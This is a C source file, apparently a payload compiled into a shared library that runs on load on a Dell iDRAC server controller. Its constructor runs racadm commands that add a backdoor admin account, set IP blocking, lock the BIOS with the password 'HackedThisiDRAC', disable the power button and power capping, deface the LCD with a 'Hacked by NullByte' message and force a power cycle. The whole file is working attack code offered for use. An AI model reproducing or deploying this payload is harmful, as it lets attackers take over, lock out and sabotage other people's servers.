#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stddef.h>

/* Helper: fork + execve using raw syscalls.
   argv must be NULL-terminated. envp can be NULL (inherits environment). */
static void exec_cmd(const char *path, char *const argv[], char *const envp[])
{
    pid_t pid = (pid_t)syscall(SYS_fork);
    if (pid == 0) {
        /* Child: replace image */
        syscall(SYS_execve, path, argv, envp);
        /* If execve fails, exit with error */
        syscall(SYS_exit, 1);
    } else if (pid > 0) {
        /* Parent: wait for child to finish */
        syscall(SYS_wait4, pid, NULL, 0, NULL);
    }
    /* If fork fails, simply continue – we cannot do much else in a constructor. */
}

static void main(void) __attribute__((constructor));
static void main(void)
{
    /* Absolute paths – avoid relying on PATH */
    const char *racadm = "/usr/sbin/racadm";
    const char *sh     = "/bin/sh";

    /* User admin configuration */
    exec_cmd(racadm, (char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminUserName", "{username}", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPassword", "{password}", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPrivilege", "{privilege}", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminEnable", "1", NULL }, NULL);

    /* Run enterprise script */
    exec_cmd(sh, (char *const[]){ "sh", "/avct/sbin/enterprise.sh", NULL }, NULL);

    /* iDRAC settings */
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "iDRAC.IPBlocking.RangeAddr", "x.x.x.x", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "iDRAC.IPBlocking.RangeMask", "255.255.0.0", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "iDRAC.IPBlocking.RangeEnable", "1", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "iDRAC.IPBlocking.BlockEnable", "1", NULL }, NULL);

    /* BIOS and power settings */
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "LifecycleController.LCAttributes.CollectSystemInventoryOnRestart", "1", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.SysProfile", "Custom", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.EnergyPerformanceBias", "MaxPower", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "System.Power.Cap.Enable", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "System.Power.Hotspare.Enable", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.ProcSettings.ControlledTurbo", "Enabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.UncoreFrequency", "MaxUFS", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.MemFrequency", "MaxPerf", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.MemPatrolScrub", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.ProcSettings.DynamicCoreAllocation", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.ProcCStates", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.ProcC1E", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.MonitorMwait", "Disabled", NULL }, NULL);

    /* Thermal and security settings */
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "System.ThermalSettings.FanSpeedOffset", "1", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysSecurity.PwrButton", "Disabled", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "BIOS.SysSecurity.SetupPassword", "HackedThisiDRAC", NULL }, NULL);

    /* LCD settings */
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "System.LCD.Configuration", "0", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "System.LCD.UserDefinedString", "Hacked by NullByte :3     Contact: me@nullbyte.rip", NULL }, NULL);

    /* Job queue */
    exec_cmd(racadm, (char *const[]){ "racadm", "jobqueue", "create", "BIOS.Setup.1-1", "-r", "pwrcycle", "-s", "TIME_NOW", NULL }, NULL);

    /* At the end because resets payload */
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "iDRAC.SSH.Enable", "1", NULL }, NULL);
    exec_cmd(racadm, (char *const[]){ "racadm", "set", "iDRAC.WebServer.Enable", "1", NULL }, NULL);
}
